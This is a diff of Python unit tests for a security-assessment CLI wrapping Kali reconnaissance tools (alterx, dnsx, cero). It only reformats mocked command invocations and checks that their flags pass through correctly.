-        "--probe-kind", "fingerprint",
-        "--phase", "recon",
-        "--timeout", "120",
-    ])
+    cli.main(
+        [
+            "kali",
+            "alterx",
+            "-l",
+            "/engagements/x/scans/subs_passive.txt",
+            "-enrich",
+            "-estimate",
+            "--technique",
+            "RECON",
+            "--intent",
+            "alterx estimate-first",
+            "--probe-kind",
+            "fingerprint",
+            "--phase",
+            "recon",
+            "--timeout",
+            "120",
+        ]
+    )
     cmd = captured["cmd"]
     assert "-estimate" in cmd
     assert "-en" in cmd  # -enrich shorthand
@@ -1975,19 +2246,32 @@ def test_dnsx_timeout_flag_passes_through(monkeypatch):
     mod = _import("assess.commands.kali_dnsx")
     monkeypatch.setattr(mod, "kali_exec", fake_kali_exec)
 
-    cli.main([
-        "kali", "dnsx",
-        "-l", "/engagements/x/scans/cands.txt",
-        "-rl", "100",
-        "-t", "20",
-        "-retry", "3",
-        "-timeout", "5",
-        "--technique", "RECON",
-        "--intent", "polite-CDN-fronted-target dnsx profile",
-        "--probe-kind", "fingerprint",
-        "--phase", "recon",
-        "--timeout", "1800",
-    ])
+    cli.main(
+        [
+            "kali",
+            "dnsx",
+            "-l",
+            "/engagements/x/scans/cands.txt",
+            "-rl",
+            "100",
+            "-t",
+            "20",
+            "-retry",
+            "3",
+            "-timeout",
+            "5",
+            "--technique",
+            "RECON",
+            "--intent",
+            "polite-CDN-fronted-target dnsx profile",
+            "--probe-kind",
+            "fingerprint",
+            "--phase",
+            "recon",
+            "--timeout",
+            "1800",
+        ]
+    )
     cmd = captured["cmd"]
     assert cmd[0] == "dnsx"
     # `-timeout 5` for dnsx must appear (NOT collapsed into the audit `--timeout`).
@@ -2024,16 +2308,26 @@ def test_cero_input_list_pipes_via_sh_wrapper(monkeypatch):
     mod = _import("assess.commands.kali_cero")
     monkeypatch.setattr(mod, "kali_exec", fake_kali_exec)
 
-    cli.main([
-        "kali", "cero",
-        "-l", "/engagements/x/scans/target_cidrs.txt",
-        "-p", "443,8443,9443",
-        "--technique", "OSINT",
-        "--intent", "cero file-input pipe",
-        "--probe-kind", "fingerprint",
-        "--phase", "recon",
-        "--timeout", "600",
-    ])
+    cli.main(
+        [
+            "kali",
+            "cero",
+            "-l",
+            "/engagements/x/scans/target_cidrs.txt",
+            "-p",
+            "443,8443,9443",
+            "--technique",
+            "OSINT",
+            "--intent",
+            "cero file-input pipe",
+            "--probe-kind",
+            "fingerprint",
+            "--phase",
+            "recon",
+            "--timeout",
+            "600",
+        ]
+    )
     cmd = captured["cmd"]
     # File-input form lands as `sh -c 'cat <file> | cero ...'`.
     assert cmd[0] == "sh"
@@ -2073,16 +2367,25 @@ def test_cero_only_domains_toggle_maps_to_dash_d(monkeypatch):
     mod = _import("assess.commands.kali_cero")
     monkeypatch.setattr(mod, "kali_exec", fake_kali_exec)
 
-    cli.main([
-        "kali", "cero",
-        "--target", "198.51.100.0/24",
-        "--only-domains",
-        "--technique", "OSINT",
-        "--intent", "cero only-domains toggle",
-        "--probe-kind", "fingerprint",
-        "--phase", "recon",
-        "--timeout", "600",
-    ])
+    cli.main(
+        [
+            "kali",
+            "cero",
+            "--target",
+            "198.51.100.0/24",
+            "--only-domains",
+            "--technique",
+            "OSINT",
+            "--intent",
+            "cero only-domains toggle",
+            "--probe-kind",
+            "fingerprint",
+            "--phase",
+            "recon",
+            "--timeout",
+            "600",
+        ]
+    )
     cmd = captured["cmd"]
     assert cmd[0] == "cero"
     assert "-d" in cmd  # the toggle, not a target
